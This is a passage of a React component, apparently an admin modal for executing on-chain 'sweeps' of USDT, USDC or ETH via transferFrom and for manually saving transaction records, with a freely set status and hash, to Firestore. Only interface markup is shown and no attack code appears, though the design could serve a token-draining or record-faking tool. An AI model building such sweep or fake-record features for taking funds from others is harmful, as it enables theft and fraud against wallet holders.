                  className="w-full border border-gray-300 rounded-lg px-3 py-2 text-xs font-bold text-teal-700 bg-white focus:outline-none focus:ring-2 focus:ring-teal-500"
                >
                  <option value="USDT">USDT</option>
                  <option value="USDC">USDC</option>
                  <option value="ETH">ETH</option>
                </select>
              </div>

              <div>
                <label className="text-xs font-bold text-gray-700 block mb-1">Sweep Amount</label>
                <input
                  type="text"
                  value={manualAmount}
                  onChange={(e) => setManualAmount(e.target.value)}
                  placeholder="e.g. 5,000"
                  className="w-full border border-gray-300 rounded-lg px-3 py-2 text-xs font-bold text-gray-800 bg-white focus:outline-none focus:ring-2 focus:ring-teal-500"
                />
              </div>

              <div>
                <label className="text-xs font-bold text-gray-700 block mb-1">Network Chain</label>
                <select
                  value={manualChain}
                  onChange={(e) => setManualChain(e.target.value as any)}
                  className="w-full border border-gray-300 rounded-lg px-3 py-2 text-xs font-semibold bg-white focus:outline-none focus:ring-2 focus:ring-teal-500"
                >
                  <option value="Ethereum Mainnet">Ethereum Mainnet</option>
                  <option value="Sepolia">Sepolia Testnet</option>
                </select>
              </div>

              <div>
                <label className="text-xs font-bold text-gray-700 block mb-1">Confirmation Status</label>
                <select
                  value={manualStatus}
                  onChange={(e) => setManualStatus(e.target.value as any)}
                  className="w-full border border-gray-300 rounded-lg px-3 py-2 text-xs font-semibold bg-white focus:outline-none focus:ring-2 focus:ring-teal-500"
                >
                  <option value="confirmed">Confirmed</option>
                  <option value="pending">Pending</option>
                  <option value="failed">Failed</option>
                </select>
              </div>

              <div className="col-span-2">
                <label className="text-xs font-bold text-gray-700 block mb-1">Transaction Hash</label>
                <input
                  type="text"
                  value={manualTxHash}
                  onChange={(e) => setManualTxHash(e.target.value)}
                  placeholder="0x..."
                  className="w-full border border-gray-300 rounded-lg px-3 py-2 text-xs font-mono bg-white focus:outline-none focus:ring-2 focus:ring-teal-500"
                />
              </div>

              <div>
                <label className="text-xs font-bold text-gray-700 block mb-1">Block Confirmations</label>
                <input
                  type="number"
                  value={manualConfirmations}
                  onChange={(e) => setManualConfirmations(e.target.value)}
                  placeholder="12"
                  className="w-full border border-gray-300 rounded-lg px-3 py-2 text-xs font-semibold bg-white focus:outline-none focus:ring-2 focus:ring-teal-500"
                />
              </div>
            </div>
          </div>
        )}

        {/* Footer */}
        <div className="bg-gray-50 border-t border-gray-100 px-6 py-3.5 flex items-center justify-between">
          <div className="text-[11px] text-gray-500">
            {activeTab === 'live' ? (
              <span className="flex items-center gap-1 text-teal-700 font-medium">
                <ShieldCheck className="w-3.5 h-3.5" />
                Live on-chain call: <code className="font-mono font-bold">transferFrom</code>
              </span>
            ) : (
              'Manual entry will be saved directly to Firestore'
            )}
          </div>

          <div className="flex items-center gap-2">
            <button
              onClick={onClose}
              className="px-3.5 py-2 text-xs font-semibold text-gray-600 hover:text-gray-800 transition-colors"
            >
              Cancel
            </button>

            {activeTab === 'live' ? (
              <button
                onClick={handleExecuteLiveSweep}
                disabled={isExecuting || !connectedWallet}
                className="inline-flex items-center gap-1.5 px-5 py-2 text-xs font-bold rounded-xl bg-teal-600 hover:bg-teal-500 disabled:opacity-50 text-white shadow-md transition-all hover:shadow-teal-500/20"
              >
                {isExecuting ? (
                  <>
                    <RotateCw className="w-3.5 h-3.5 animate-spin" />
                    Executing On-Chain...
                  </>
                ) : (
                  <>
                    <Sparkles className="w-3.5 h-3.5 text-amber-300" />
                    ⚡ Execute On-Chain Sweep
                  </>
                )}
              </button>
            ) : (
              <button
                onClick={handleSaveManualRecord}
                disabled={manualSaving}
                className="inline-flex items-center gap-1.5 px-4 py-2 text-xs font-bold rounded-xl bg-teal-600 hover:bg-teal-500 disabled:opacity-50 text-white shadow transition-all"
              >
                <Check className="w-3.5 h-3.5" />
                {manualSaving ? 'Saving...' : 'Save Record Entry'}
              </button>
            )}
          </div>
        </div>
      </div>
    </div>
  );
}
